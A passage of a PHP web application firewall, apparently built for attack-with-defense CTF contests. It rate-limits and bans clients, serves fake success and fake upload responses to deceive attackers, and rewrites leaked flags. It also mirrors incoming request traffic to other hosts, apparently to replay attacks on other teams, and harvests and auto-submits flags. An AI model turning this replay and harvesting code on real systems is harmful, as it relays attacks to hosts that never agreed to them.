        unset($data[$ip]);
        pwaf_log($cfg, $ip, 'checker_whitelist', 'ip', $ip, 'whitelist');
    }
    @file_put_contents($track_file, json_encode($data), LOCK_EX);
}

function pwaf_rate_check(array &$cfg, $ip) {
    $db    = (isset($cfg['rate_db']) ? $cfg['rate_db'] : ((isset($cfg['datadir']) ? $cfg['datadir'] : dirname(PWAF_SELF)) . '/.pwaf_rate'));
    $limit = (int)((isset($cfg['rate_limit']) ? $cfg['rate_limit'] : 80));
    $now   = time();

    $fp = @fopen($db, 'c+');
    if (!$fp) return false;
    flock($fp, LOCK_EX);
    $data = json_decode(stream_get_contents($fp), true) ?: [];

        foreach ($data as $k => $v) {
        if ($now - ((isset($v['s']) ? $v['s'] : 0)) > 120) unset($data[$k]);
    }

    if (!isset($data[$ip]) || $now - $data[$ip]['s'] > 60) {
        $data[$ip] = ['s' => $now, 'n' => 1];
    } else {
        $data[$ip]['n']++;
    }
    $count = $data[$ip]['n'];

    ftruncate($fp, 0); rewind($fp);
    fwrite($fp, json_encode($data));
    flock($fp, LOCK_UN); fclose($fp);

    if ($count > $limit) {
        pwaf_auto_ban($cfg, $ip);
        return true;
    }
    return false;
}

function pwaf_auto_ban(array &$cfg, $ip) {
    if (empty($cfg['auto_ban'])) return;       if (!in_array($ip, $cfg['blacklist'], true)
        && !in_array($ip, $cfg['checker_ips'], true)
        && !in_array($ip, $cfg['whitelist'], true)) {
        $cfg['blacklist'][] = $ip;
        pwaf_save_cfg($cfg);
    }
}

function pwaf_block(array $cfg, $ip, $rule, $param, $payload, $t0 = 0.0) {
    pwaf_log($cfg, $ip, $rule, $param, $payload, 'block', $t0);

        if ($rule === 'upload' && !empty($cfg['fake_upload'])) {
                $backup_dir = dirname((isset($cfg['log']) ? $cfg['log'] : PWAF_SELF)) . '/.pwaf_uploads';
        if (!is_dir($backup_dir)) @mkdir($backup_dir, 0700, true);
        foreach ($GLOBALS['_PWAF_FILES'] as $field => $f) {
            $tmps  = is_array($f['tmp_name']) ? $f['tmp_name'] : [$f['tmp_name']];
            $names = is_array($f['name'])     ? $f['name']     : [$f['name']];
            foreach ($tmps as $i => $tmp) {
                if (!$tmp || !is_uploaded_file($tmp)) continue;
                $ext = pathinfo((isset($names[$i]) ? $names[$i] : ''), PATHINFO_EXTENSION);
                $bk  = $backup_dir . '/' . date('md_His') . '_' . random_int(1000,9999) . '.' . $ext . '.txt';
                @copy($tmp, $bk);
                @unlink($tmp);
            }
        }
                pwaf_chameleon_upload_response($cfg);
        exit;
    }

    if (!empty($cfg['stealth'])) {
                pwaf_random_delay();
        pwaf_chameleon_response($cfg, $rule);
    } else {
        http_response_code(403);
        $rid = strtoupper(substr(md5($ip . microtime(true) . random_int(0,999999)), 0, 8));
        echo '<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><title>请求被拦截</title>'
           . '<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0e1a;color:#c9d1e0;'
           . 'font-family:Consolas,monospace;display:flex;align-items:center;justify-content:center;min-height:100vh}'
           . '.box{background:#0f1629;border:1px solid #991b1b;border-radius:10px;padding:36px 40px;max-width:480px;text-align:center}'
           . '.icon{font-size:48px;margin-bottom:16px}.title{color:#f87171;font-size:20px;font-weight:bold;margin-bottom:8px}'
           . '.sub{color:#4a5568;font-size:12px;margin-bottom:20px}.rule{display:inline-block;background:#991b1b;'
           . 'color:#fff;padding:3px 10px;border-radius:4px;font-size:12px;font-weight:bold;margin-bottom:16px}'
           . '.rid{color:#1e2d4a;font-size:10px;margin-top:16px}</style></head>'
           . '<body><div class="box"><div class="icon">&#x1F6AB;</div>'
           . '<div class="title">请求已被拦截</div>'
           . '<div class="sub">PhoenixWAF 检测到恶意请求</div>'
                      . '<div class="sub">如有疑问请联系管理员</div>'
           . '<div class="rid">REF: ' . $rid . '</div>'
           . '</div></body></html>';
    }
    exit;
}

function pwaf_random_delay() {
    // Box-Muller 正态分布: 均值 80ms, 标准差 40ms, 截断到 15ms-300ms
        $u1 = random_int(1, 999999) / 1000000;
    $u2 = random_int(1, 999999) / 1000000;
    $z  = sqrt(-2 * log($u1)) * cos(2 * M_PI * $u2);
    $ms = 80 + $z * 40;
    $ms = max(15, min(300, $ms));
    usleep((int)($ms * 1000));
}

function pwaf_chameleon_response(array $cfg, $rule) {
        $style = pwaf_learn_app_style($cfg);

    $ct   = strtolower((isset($GLOBALS['_PWAF_SERVER']['CONTENT_TYPE']) ? $GLOBALS['_PWAF_SERVER']['CONTENT_TYPE'] : ''));
    $acc  = strtolower((isset($GLOBALS['_PWAF_SERVER']['HTTP_ACCEPT']) ? $GLOBALS['_PWAF_SERVER']['HTTP_ACCEPT'] : ''));
    $ajax = !empty($GLOBALS['_PWAF_SERVER']['HTTP_X_REQUESTED_WITH']) || strpos($ct, 'json') !== false || strpos($acc, 'json') !== false;
    $uri  = (isset($GLOBALS['_PWAF_SERVER']['REQUEST_URI']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_URI'] : '/');

    http_response_code(200);

    if ($ajax) {
        header('Content-Type: application/json; charset=utf-8');
                $json_families = [
                        function() {
                $codes = [0, 200, 1000, 1];
                $msgs  = ['success', 'ok', 'OK', 'Success', 'Done', 'Completed', 'Request processed'];
                return json_encode([
                    'code' => $codes[array_rand($codes)],
                    'message' => $msgs[array_rand($msgs)],
                    'data' => random_int(0,1) ? new \stdClass() : null,
                    'timestamp' => time(),
                ], JSON_UNESCAPED_UNICODE);
            },
                        function() use ($uri) {
                $r = ['status' => random_int(0,1) ? true : 'success'];
                if (random_int(0,1)) $r['redirect'] = $uri;
                if (random_int(0,2) === 0) $r['flash'] = ['type' => 'success', 'message' => '操作成功'];
                return json_encode($r, JSON_UNESCAPED_UNICODE);
            },
                        function() {
                return json_encode([
                    'code' => 1,
                    'msg'  => '操作成功',
                    'time' => time(),
                    'data' => [],
                ], JSON_UNESCAPED_UNICODE);
            },
                        function() {
                $simple = [
                    ['ok' => true],
                    ['result' => 'success'],
                    ['ret' => 0, 'msg' => ''],
                    ['error' => 0],
                    ['success' => true, 'msg' => 'ok'],
                ];
                return json_encode($simple[array_rand($simple)]);
            },
                        function() {
                return json_encode([
                    'detail' => 'OK',
                    'status_code' => 200,
                ]);
            },
        ];
        echo $json_families[array_rand($json_families)]();
    } else {
                header('Content-Type: text/html; charset=utf-8');
        $html_families = [
                        function() use ($uri, $style) {
                $base = parse_url($uri, PHP_URL_PATH) ?: '/';
                $title = (isset($style['title']) ? $style['title'] : ['首页','管理后台','系统','Home'][array_rand(['首页','管理后台','系统','Home'])]);
                return "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>{$title}</title>"
                     . "<meta http-equiv=\"refresh\" content=\"0;url={$base}\"></head>"
                     . "<body></body></html>";
            },
                        function() use ($style) {
                $title = (isset($style['title']) ? $style['title'] : 'OK');
                $bodies = [
                    "<p>OK</p>",
                    "<div class=\"container\"><p>操作成功</p></div>",
                    "<div class=\"alert alert-success\">请求已处理</div>",
                    "<section><p>Success</p></section>",
                    "",                 ];
                $body = $bodies[array_rand($bodies)];
                return "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>{$title}</title></head><body>{$body}</body></html>";
            },
                        function() use ($style) {
                $token = bin2hex(random_bytes(16));
                $title = (isset($style['title']) ? $style['title'] : '提交成功');
                return "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>{$title}</title></head>"
                     . "<body><input type=\"hidden\" name=\"_token\" value=\"{$token}\"><p>提交成功</p></body></html>";
            },
        ];
        echo $html_families[array_rand($html_families)]();
    }

        $random_headers = [
        ['X-Request-Id', bin2hex(random_bytes(8))],
        ['X-Runtime', sprintf('%.6f', random_int(10, 150) / 1000)],
        ['X-Powered-By', ['PHP/' . PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION, 'Express', 'Phusion Passenger'][array_rand(['a','b','c'])]],
    ];
        shuffle($random_headers);
    $n = random_int(0, 2);
    for ($i = 0; $i < $n && $i < count($random_headers); $i++) {
        header($random_headers[$i][0] . ': ' . $random_headers[$i][1]);
    }
}

function pwaf_chameleon_upload_response(array $cfg) {
    pwaf_random_delay();
    http_response_code(200);

    $ct = strtolower((isset($GLOBALS['_PWAF_SERVER']['CONTENT_TYPE']) ? $GLOBALS['_PWAF_SERVER']['CONTENT_TYPE'] : ''));
    $acc = strtolower((isset($GLOBALS['_PWAF_SERVER']['HTTP_ACCEPT']) ? $GLOBALS['_PWAF_SERVER']['HTTP_ACCEPT'] : ''));
    $is_json = strpos($ct, 'json') !== false || strpos($acc, 'json') !== false || !empty($GLOBALS['_PWAF_SERVER']['HTTP_X_REQUESTED_WITH']);

        $upload_dirs = ['uploads', 'upload', 'files', 'media', 'static/upload', 'data/upload', 'public/uploads',
                    'storage/app/public', 'wp-content/uploads/' . date('Y/m'), 'attachments'];
    $dir = $upload_dirs[array_rand($upload_dirs)];
    $orig_name = (isset($GLOBALS['_PWAF_FILES'][(array_key_first($GLOBALS['_PWAF_FILES']) !== null ? array_key_first($GLOBALS['_PWAF_FILES']) : 'file')]['name']) ? $GLOBALS['_PWAF_FILES'][(array_key_first($GLOBALS['_PWAF_FILES']) !== null ? array_key_first($GLOBALS['_PWAF_FILES']) : 'file')]['name'] : 'file.jpg');
    $ext = strtolower(pathinfo($orig_name, PATHINFO_EXTENSION) ?: 'jpg');
        $safe_exts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'txt', 'pdf', 'doc', 'zip'];
    if (!in_array($ext, $safe_exts, true)) $ext = $safe_exts[array_rand($safe_exts)];

        $name_strategies = [
        function() use ($ext) { return date('YmdHis') . '_' . random_int(1000,9999) . '.' . $ext; },
        function() use ($ext) { return substr(md5(uniqid('', true)), 0, random_int(12, 24)) . '.' . $ext; },
        function() use ($ext) { return bin2hex(random_bytes(random_int(6,12))) . '.' . $ext; },
        function() use ($ext, $orig_name) {
            $base = pathinfo($orig_name, PATHINFO_FILENAME);
            return $base . '_' . time() . '.' . $ext;
        },
        function() use ($ext) {
            $uuid = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
                random_int(0,0xffff), random_int(0,0xffff), random_int(0,0xffff),
                random_int(0,0x0fff)|0x4000, random_int(0,0x3fff)|0x8000,
                random_int(0,0xffff), random_int(0,0xffff), random_int(0,0xffff));
            return $uuid . '.' . $ext;
        },
    ];
    $fake_name = $name_strategies[array_rand($name_strategies)]();
    $fake_url  = '/' . $dir . '/' . $fake_name;
    $fake_size = random_int(1024, 512000); 
    if ($is_json) {
        header('Content-Type: application/json; charset=utf-8');
                $json_upload_families = [
                        function() use ($fake_url, $fake_name, $fake_size) {
                return json_encode([
                    'code' => 0,
                    'msg' => '',
                    'data' => [
                        'src' => $fake_url,
                        'title' => pathinfo($fake_name, PATHINFO_FILENAME),
                    ],
                ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
            },
                        function() use ($fake_url, $fake_name, $fake_size) {
                return json_encode([
                    'success' => true,
                    'file' => [
                        'url'  => $fake_url,
                        'name' => $fake_name,
                        'size' => $fake_size,
                        'type' => 'image/' . pathinfo($fake_name, PATHINFO_EXTENSION),
                    ],
                ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
            },
                        function() use ($fake_url) {
                return json_encode([
                    'errno' => 0,
                    'data' => [['url' => $fake_url, 'alt' => '', 'href' => '']],
                ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
            },
                        function() use ($fake_url, $fake_name, $fake_size, $ext) {
                return json_encode([
                    'state'    => 'SUCCESS',
                    'url'      => $fake_url,
                    'title'    => $fake_name,
                    'original' => $fake_name,
                    'type'     => '.' . $ext,
                    'size'     => $fake_size,
                ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
            },
                        function() use ($fake_url) {
                return json_encode(['url' => $fake_url, 'status' => 'done']);
            },
        ];
        echo $json_upload_families[array_rand($json_upload_families)]();
    } else {
        header('Content-Type: text/html; charset=utf-8');
        $html_upload_families = [
            function() use ($fake_url) {
                return "<!DOCTYPE html><html><body><p>文件已上传</p><p><a href=\"{$fake_url}\">{$fake_url}</a></p></body></html>";
            },
            function() use ($fake_url) {
                return "<script>parent.callback('" . addslashes($fake_url) . "');</script>";
            },
            function() use ($fake_url, $fake_name) {
                return "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Upload</title></head>"
                     . "<body><div class=\"alert alert-success\">Upload successful: {$fake_name}</div></body></html>";
            },
        ];
        echo $html_upload_families[array_rand($html_upload_families)]();
    }
}

function pwaf_learn_app_style(array $cfg) {
    static $style = null;
    if ($style !== null) return $style;
    $style = [];
        $wr = (isset($cfg['webroot']) && $cfg['webroot'] !== '' ? $cfg['webroot'] : dirname(PWAF_SELF));
    foreach (['index.php', 'index.html', 'home.php'] as $idx) {
        $fp = $wr . '/' . $idx;
        if (file_exists($fp)) {
            $c = @file_get_contents($fp, false, null, 0, 4096);
            if ($c && preg_match('/<title[^>]*>([^<]+)<\/title>/i', $c, $m)) {
                $style['title'] = trim($m[1]);
                break;
            }
        }
    }
    return $style;
}

function pwaf_log(array $cfg, $ip, $rule, $param, $payload, $action, $t0 = 0.0) {
    $lp = (isset($cfg['log']) ? $cfg['log'] : (pwaf_datadir($cfg) . '/.pwaf_log'));
    $post_body = '';
    if (!empty($GLOBALS['_PWAF_POST'])) {
        $post_body = substr(http_build_query($GLOBALS['_PWAF_POST']), 0, 1536);
    } elseif (!empty($GLOBALS['_PWAF_RAW_BODY'])) {
        $post_body = substr($GLOBALS['_PWAF_RAW_BODY'], 0, 1536);
    }
    $e = json_encode([
        'ts'      => time(),
        'dt'      => date('Y-m-d H:i:s'),
        'ip'      => $ip,
        'method'  => (isset($GLOBALS['_PWAF_SERVER']['REQUEST_METHOD']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_METHOD'] : 'GET'),
        'uri'     => substr((isset($GLOBALS['_PWAF_SERVER']['REQUEST_URI']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_URI'] : '/'), 0, 500),
        'rule'    => $rule,
        'param'   => $param,
        'payload' => substr($payload, 0, 512),
        'action'  => $action,
        'ua'      => substr((isset($GLOBALS['_PWAF_SERVER']['HTTP_USER_AGENT']) ? $GLOBALS['_PWAF_SERVER']['HTTP_USER_AGENT'] : ''), 0, 200),
        'referer' => substr((isset($GLOBALS['_PWAF_SERVER']['HTTP_REFERER']) ? $GLOBALS['_PWAF_SERVER']['HTTP_REFERER'] : ''), 0, 200),
        'post'    => $post_body,
        'ms'      => $t0 > 0 ? round((microtime(true) - $t0) * 1000, 2) : 0,
    ], JSON_UNESCAPED_UNICODE) . "\n";
    // 非阻塞写入：用 flock LOCK_NB 代替 LOCK_EX 阻塞锁
    // DDoS 场景下阻塞 flock 会让 PHP-FPM 进程池排队卡死
    $fp = @fopen($lp, 'a');
    if ($fp) {
        if (@flock($fp, LOCK_EX | LOCK_NB)) {
            fwrite($fp, $e);
            flock($fp, LOCK_UN);
        } else {
            // 拿不到锁就直接写（Linux < 4KB 是原子的）
            fwrite($fp, $e);
        }
        fclose($fp);
    }
}

function pwaf_access_log(array $cfg, $ip, $action, $note, $t0) {
    if (empty($cfg['access_log'])) return;
    $lp = (isset($cfg['log']) ? $cfg['log'] : (pwaf_datadir($cfg) . '/.pwaf_log'));
    $al = preg_replace('/\.([^.]+)$/', '_access.$1', $lp);
    
        $post_body = '';
    if (!empty($GLOBALS['_PWAF_POST'])) {
        $post_body = substr(http_build_query($GLOBALS['_PWAF_POST']), 0, 1536);
    } elseif (!empty($GLOBALS['_PWAF_RAW_BODY'])) {
        $post_body = substr($GLOBALS['_PWAF_RAW_BODY'], 0, 1536);
    }
    
    $e  = json_encode([
        'ts'      => time(),
        'dt'      => date('Y-m-d H:i:s'),
        'ip'      => $ip,
        'method'  => (isset($GLOBALS['_PWAF_SERVER']['REQUEST_METHOD']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_METHOD'] : 'GET'),
        'uri'     => substr((isset($GLOBALS['_PWAF_SERVER']['REQUEST_URI']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_URI'] : '/'), 0, 500),
        'action'  => $action,
        'note'    => $note,
        'ua'      => substr((isset($GLOBALS['_PWAF_SERVER']['HTTP_USER_AGENT']) ? $GLOBALS['_PWAF_SERVER']['HTTP_USER_AGENT'] : ''), 0, 150),
        'referer' => substr((isset($GLOBALS['_PWAF_SERVER']['HTTP_REFERER']) ? $GLOBALS['_PWAF_SERVER']['HTTP_REFERER'] : ''), 0, 150),
        'post'    => $post_body,         'ms'      => round((microtime(true) - $t0) * 1000, 2),
    ], JSON_UNESCAPED_UNICODE) . "\n";
    
    // 非阻塞写入
    $fp = @fopen($al, 'a');
    if ($fp) {
        if (@flock($fp, LOCK_EX | LOCK_NB)) { fwrite($fp, $e); flock($fp, LOCK_UN); }
        else { fwrite($fp, $e); }
        fclose($fp);
    }
}

// ── 流量转发（异步镜像，不阻塞主请求）────────────────────────────────────────
// 支持 IP 段：CIDR (192.168.1.0/24) 或范围 (192.168.1.1-192.168.2.255)
function pwaf_forward(array $cfg) {
    if (empty($cfg['forward_enabled'])) return;
    $targets = (isset($cfg['forward_targets']) ? $cfg['forward_targets'] : []);
    if (empty($targets)) return;

    $method  = (isset($GLOBALS['_PWAF_SERVER']['REQUEST_METHOD']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_METHOD'] : 'GET');
    $uri     = (isset($GLOBALS['_PWAF_SERVER']['REQUEST_URI']) ? $GLOBALS['_PWAF_SERVER']['REQUEST_URI'] : '/');
    $headers = [];
    foreach ($GLOBALS['_PWAF_SERVER'] as $k => $v) {
        if (strpos($k, 'HTTP_') === 0) {
            $name = str_replace('_', '-', substr($k, 5));
            if (in_array($name, ['HOST','CONNECTION','ACCEPT-ENCODING'], true)) continue;
            $headers[] = $name . ': ' . $v;
        }
    }
        $body = (isset($GLOBALS['_PWAF_RAW_BODY']) ? $GLOBALS['_PWAF_RAW_BODY'] : '');
        $ct = strtolower((isset($GLOBALS['_PWAF_SERVER']['CONTENT_TYPE']) ? $GLOBALS['_PWAF_SERVER']['CONTENT_TYPE'] : ''));
    if (strpos($ct, 'multipart/form-data') !== false) {
        $boundary = 'PWAF' . bin2hex(random_bytes(8));
        $parts = [];
        foreach ($GLOBALS['_PWAF_POST'] as $k => $v) {
            if (is_array($v)) {
                foreach ($v as $sv) {
                    $parts[] = "--$boundary\r\nContent-Disposition: form-data; name=\"{$k}[]\"\r\n\r\n" . (string)$sv;
                }
            } else {
                $parts[] = "--$boundary\r\nContent-Disposition: form-data; name=\"$k\"\r\n\r\n" . (string)$v;
            }
        }
        foreach ($GLOBALS['_PWAF_FILES'] as $field => $f) {
            $names = is_array($f['name']) ? $f['name'] : [$f['name']];
            $types = is_array($f['type']) ? $f['type'] : [$f['type']];
            $tmps  = is_array($f['tmp_name']) ? $f['tmp_name'] : [$f['tmp_name']];
            foreach ($tmps as $i => $tmp) {
                if (!$tmp || !is_uploaded_file($tmp)) continue;
                $fname = (isset($names[$i]) ? $names[$i] : 'file');
                $ftype = (isset($types[$i]) ? $types[$i] : 'application/octet-stream');
                $fcontent = @file_get_contents($tmp);
                if ($fcontent === false) continue;
                $parts[] = "--$boundary\r\nContent-Disposition: form-data; name=\"$field\"; filename=\"$fname\"\r\nContent-Type: $ftype\r\n\r\n$fcontent";
            }
        }
        if ($parts) {
            $body = implode("\r\n", $parts) . "\r\n--$boundary--\r\n";
                        $headers = array_filter($headers, function($h) { return stripos($h, 'Content-Type:') !== 0 && stripos($h, 'Content-Length:') !== 0; });
            $headers[] = "Content-Type: multipart/form-data; boundary=$boundary";
            $headers[] = "Content-Length: " . strlen($body);
        }
    } elseif ($body !== '') {
        // 非 multipart 但有 body（POST JSON/urlencoded/raw）— 修正 Content-Length，
                        $headers = array_filter($headers, function($h) { return stripos($h, 'Content-Length:') !== 0 && stripos($h, 'Content-Type:') !== 0; });
        if (!empty($GLOBALS['_PWAF_SERVER']['CONTENT_TYPE'])) $headers[] = 'Content-Type: ' . $GLOBALS['_PWAF_SERVER']['CONTENT_TYPE'];
        $headers[] = "Content-Length: " . strlen($body);
    }

    // 预先解析目标 URL（过滤 CIDR），最多 64 个，避免 host:1-65535 之类拖垮
    $urls = [];
    $srcip = pwaf_ip();
    foreach ($targets as $t) {
        if (count($urls) >= 64) break;
        if (empty($t['enabled'])) continue;
        $host = trim((isset($t['host']) ? $t['host'] : ''));
        $port = (int)((isset($t['port']) ? $t['port'] : 80));
        $cidr = trim((isset($t['cidr']) ? $t['cidr'] : ''));
        if (!$host) continue;
        if ($cidr && !pwaf_ip_in_range($srcip, $cidr)) continue;
        $scheme = ($port === 443) ? 'https' : 'http';
        $urls[] = $scheme . '://' . $host . ($port !== 80 && $port !== 443 ? ':' . $port : '') . $uri;
    }
    if (!$urls) return;

    // 非阻塞镜像：先把响应交还客户端(裁判机不受任何延迟)，再后台转发。
    $hdr = implode("\r\n", $headers);
    // 有 fastcgi_finish_request(PHP-FPM)时响应已提前返回，可用较大预算；
    // 无该函数时(mod_php / php -S)转发仍在响应链路上，用硬性 3s 总预算封顶，
    // 避免多目标 × 1s 把正常请求(含裁判机)拖住。
    $can_detach = function_exists('fastcgi_finish_request');
    $budget = $can_detach ? 30.0 : 3.0;
    $doer = function() use ($urls, $method, $hdr, $body, $budget) {
        $deadline = microtime(true) + $budget;
        foreach ($urls as $url) {
            if (microtime(true) >= $deadline) break;   // 总时间预算用尽，停止转发
            $ctx = stream_context_create(['http' => [
                'method' => $method, 'header' => $hdr, 'content' => $body,
                'timeout' => 1, 'ignore_errors' => true,
            ]]);
            @file_get_contents($url, false, $ctx);
        }
    };
    register_shutdown_function(function() use ($doer, $can_detach) {
        if ($can_detach) @fastcgi_finish_request();
        $doer();
    });
}

function pwaf_ip_in_range($ip, $range) {
    $ip_long = ip2long($ip);
    if ($ip_long === false) return false;
        if (strpos($range, '/') !== false) {
        list($net, $bits) = explode('/', $range, 2);
        $bits = (int)$bits;
        if ($bits < 0 || $bits > 32) return false;
        $net_long = ip2long(trim($net));
        if ($net_long === false) return false;          // 非法网络地址直接拒绝，避免退化成 0.0.0.0
        $mask = $bits === 0 ? 0 : (~0 << (32 - $bits));
        return ($ip_long & $mask) === ($net_long & $mask);
    }
        if (strpos($range, '-') !== false) {
        list($start, $end) = explode('-', $range, 2);
        $s = ip2long(trim($start)); $e = ip2long(trim($end));
        if ($s === false || $e === false) return false;
        return $ip_long >= min($s,$e) && $ip_long <= max($s,$e);
    }
        $single = ip2long(trim($range));
    return $single !== false && $ip_long === $single;
}

// ── 高效读取文件末尾若干行（fseek 只读尾部，避免把不断增长的日志整体载入内存）──
function pwaf_tail_lines($file, $maxLines = 50, $maxBytes = 65536) {
    $sz = @filesize($file);
    if ($sz === false || $sz === 0) return [];
    $fp = @fopen($file, 'rb');
    if (!$fp) return [];
    $start = $sz > $maxBytes ? $sz - $maxBytes : 0;
    if ($start > 0) @fseek($fp, $start);
    $data = @fread($fp, $sz - $start);
    @fclose($fp);
    if ($data === false || $data === '') return [];
    if ($start > 0) { $nl = strpos($data, "\n"); if ($nl !== false) $data = substr($data, $nl + 1); } // 丢弃可能被截断的首行
    $lines = preg_split('/\r?\n/', $data, -1, PREG_SPLIT_NO_EMPTY);
    return array_slice($lines, -$maxLines);
}

// ── 多编码 flag 提取（重放/盲打响应用）──────────────────────────────────────
// 重放/盲打回来的响应可能把 flag 编码了；这里覆盖明文 / base64 / hex / url / 倒序，
// 且默认同时匹配 flag{} 与 ctf{}，避免漏收割。
function pwaf_extract_flags($text, array $cfg) {
    if (!is_string($text) || $text === '') return [];
    $fp = !empty($cfg['flagsub_regex'])
        ? '/' . str_replace('/', '\/', $cfg['flagsub_regex']) . '/i'
        : '/(?:flag|ctf)\{[A-Za-z0-9_\-\.!@#$%^&*()+=]{1,100}\}/i';
    $found = [];
    if (preg_match_all($fp, $text, $m)) foreach ($m[0] as $f) $found[$f] = 1;
    // 编码类提取代价较高，超大响应只扫前 256KB（flag 极少藏在数百 KB 之后）
    if (strlen($text) > 262144) $text = substr($text, 0, 262144);
    if (strpos($text, 'Zmxh') !== false || stripos($text, 'Y3Rm') !== false) {   // base64 of flag{/ctf{
        if (preg_match_all('/[A-Za-z0-9+\/]{16,}={0,2}/', $text, $bm))
            foreach ($bm[0] as $t) { $d = base64_decode($t, true); if ($d !== false && preg_match_all($fp, $d, $dm)) foreach ($dm[0] as $f) $found[$f] = 1; }
    }
    if (stripos($text, '666c6167') !== false || stripos($text, '637466') !== false) {   // hex of flag/ctf
        if (preg_match_all('/[0-9a-fA-F]{20,}/', $text, $hm))
            foreach ($hm[0] as $t) { if (strlen($t) % 2) continue; $d = @hex2bin($t); if ($d !== false && preg_match_all($fp, $d, $dm)) foreach ($dm[0] as $f) $found[$f] = 1; }
    }
    if (strpos($text, '%7') !== false) { $u = rawurldecode($text); if ($u !== $text && preg_match_all($fp, $u, $um)) foreach ($um[0] as $f) $found[$f] = 1; }
    if (stripos($text, '{galf') !== false || stripos($text, '{ftc') !== false) { $r = strrev($text); if (preg_match_all($fp, $r, $rm)) foreach ($rm[0] as $f) $found[$f] = 1; }
    return array_keys($found);
}

function pwaf_auto_submit_flag($flag, array $cfg) {
    if (empty($cfg['flagsub_enabled']) || empty($cfg['flagsub_template'])) return;
    $tpl = $cfg['flagsub_template'];
        // 格式: 第一行 "METHOD /path HTTP/1.1\r\nHost: xxx\r\n...\r\n\r\nbody"
    $tpl = str_replace('${flag}', $flag, $tpl);
    $lines = explode("\n", str_replace("\r\n", "\n", $tpl));
    $first = trim(array_shift($lines));
    if (!preg_match('/^(GET|POST|PUT|PATCH|DELETE)\s+(\S+)\s+HTTP/i', $first, $m)) return;
    $req_method = strtoupper($m[1]);
    $req_path   = $m[2];
    $host = ''; $headers = []; $body_start = false; $body_lines = [];
    foreach ($lines as $line) {
        $line = rtrim($line);
        if ($body_start) { $body_lines[] = $line; continue; }
        if ($line === '') { $body_start = true; continue; }
        // ${flag} 替换后 body 长度会变，模板里写死的 Content-Length 会导致目标截断/挂起，此处丢弃自动重算
        if (stripos($line, 'content-length:') === 0) continue;
        if (stripos($line, 'host:') === 0) {
            $host = trim(substr($line, 5));
        } else {
            $headers[] = $line;
        }
    }
    if (!$host) return;
    $body = implode("\r\n", $body_lines);
    if ($body !== '') $headers[] = 'Content-Length: ' . strlen($body);
        $scheme = (preg_match('/:443$/', $host)) ? 'https' : 'http';
    $url = $scheme . '://' . $host . $req_path;
    $ctx = stream_context_create(['http' => [
        'method'        => $req_method,
        'header'        => implode("\r\n", $headers),
        'content'       => $body,
        'timeout'       => 5,
        'ignore_errors' => true,
    ]]);
    $resp = @file_get_contents($url, false, $ctx);
        $lp = (isset($cfg['log']) ? $cfg['log'] : (pwaf_datadir($cfg) . '/.pwaf_log'));
    $fl = preg_replace('/\.([^.]+)$/', '_flagsub.$1', $lp);
    @file_put_contents($fl, json_encode([
        'ts'   => time(), 'dt' => date('Y-m-d H:i:s'),
        'flag' => $flag, 'url' => $url,
        'resp' => substr((string)$resp, 0, 200),
    ], JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND);
}


function pwaf_response_hook($out, array $cfg, $ip) {
            $was_compressed = false;
    $compress_encoding = '';
    if (strlen($out) > 2) {
                if (substr($out, 0, 2) === "\x1f\x8b") {
            $decompressed = @gzdecode($out);
            if ($decompressed !== false) {
                $was_compressed = true;
                $compress_encoding = 'gzip';
                $out = $decompressed;
            }
        }
                elseif ($out[0] === "\x78" && in_array($out[1], array("\x01","\x5e","\x9c","\xda"))) {
            $decompressed = @gzuncompress($out);
            if ($decompressed !== false) {
                $was_compressed = true;
                $compress_encoding = 'deflate';
                $out = $decompressed;
            }
        }
    }

    $fake = (isset($cfg['fake_flag']) ? $cfg['fake_flag'] : 'flag{fake}');
        $default_regex = '(?:flag|ctf)\{[A-Za-z0-9_\-\.!@#$%^&*()+=]{1,100}\}';

    $fp = !empty($cfg['flagsub_regex'])
        ? '/' . str_replace('/', '\/', $cfg['flagsub_regex']) . '/'
        : '/' . $default_regex . '/i';

    // 各编码分支统一"命中即改写 $out"，最后统一重压缩 + 修正 Content-Length 返回。
    // 每个分支都独立执行（不再一命中就跳过其余）：同一响应里 flag 可能以多种编码同时
    // 出现，必须逐一擦除。$modified 仅用于驱动末尾重压缩/Content-Length 修正。
    // 触发标记：设了自定义 flag 正则时无法预知编码特征，一律进入分支（由 $fp 兜底匹配）；
    // 默认格式则同时覆盖 flag{ 与 ctf{ 的编码标记（与 pwaf_extract_flags 一致）。
    $modified = false;
    $custom   = !empty($cfg['flagsub_regex']);

        if (preg_match($fp, $out, $flagm)) {
        pwaf_auto_submit_flag($flagm[0], $cfg);
        pwaf_log($cfg, $ip, 'flag_leak', 'response', substr($out, 0, 200), 'replaced');
        $out = preg_replace($fp, pwaf_same_length_fake($flagm[0], $fake), $out);
        $modified = true;
    }

    // Base64-encoded flag (base64 of 'fla'→Zmxh / 'ctf'→Y3Rm)
    if ($custom || strpos($out, 'Zmxh') !== false || stripos($out, 'Y3Rm') !== false) {
        $mod = preg_replace_callback('/[A-Za-z0-9+\/]{16,}={0,2}/', function($m) use ($fp, $fake) {
            $d = base64_decode($m[0], true);
            if ($d !== false && preg_match($fp, $d)) {
                return base64_encode(pwaf_same_length_fake($d, $fake));
            }
            return $m[0];
        }, $out);
        if ($mod !== $out) {
            pwaf_log($cfg, $ip, 'flag_leak_b64', 'response', substr($out, 0, 200), 'replaced');
            $out = $mod; $modified = true;
        }
    }

    // Hex-encoded flag (hex of 'flag'→666c6167 / 'ctf'→637466)
    if ($custom || stripos($out, '666c6167') !== false || stripos($out, '637466') !== false) {
